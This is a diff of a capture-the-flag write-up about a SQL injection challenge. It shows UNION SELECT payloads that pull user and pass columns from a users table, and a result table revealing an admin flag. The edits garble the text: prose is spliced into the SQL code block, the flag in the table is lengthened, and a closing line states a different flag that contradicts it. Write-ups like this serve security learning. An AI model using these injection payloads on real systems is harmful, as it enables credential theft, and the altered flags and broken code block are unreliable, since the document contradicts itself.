@@ -110,7 +110,7 @@ We have to use 2  **null**  columns, since the base query is taking out content 
 Great, we have  **users**  table, from which we can now try to get the flag. Here we go with the last query.
 
 ```sql
-' union SELECT user, pass, null FROM users;--
+' union SELECTSQLite injection tested here. Create a account with username `' or user like '' UNION SELECT '1', user, pass, null FROM users; --
 ```
 
 User, pass column names? Let's check that out.
@@ -138,13 +138,15 @@ User, pass column names? Let's check that out.
         </tbody>
                 <tr><td>&#39; union SELECT user, pass, null FROM users;-- </td><td> asd</td> <td> None</td></tr>
 
-                <tr><td>admin </td><td> flag{union?_why_not_onion_b80f530ed953ccdd0dfc6f2456dc7d0e}</td> <td> None</td></tr>
+                <tr><td>admin </td><td> flag{union?_why_not_onion_b80f530ed953ccdd0dfc6f2456dc7d0e6e6a3cd8e3f1fe5f6109d1618bddbd1}</td> <td> None</td></tr>
         </tbody>
     </table>
 </div>
 ```
 
-Great SQL Injection challenge!
+Great SQL Injection challenge!`, password not important.
+
+Therefore, the flag is `flag{union?_why_not_onion_a69464d4869c743e26c08df8686e4003}`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNjczNTI1MTMzXX0=
+eyJoaXN0b3J5IjpbMTMwNzk0MjMzLDY3MzUyNTEzM119
 -->
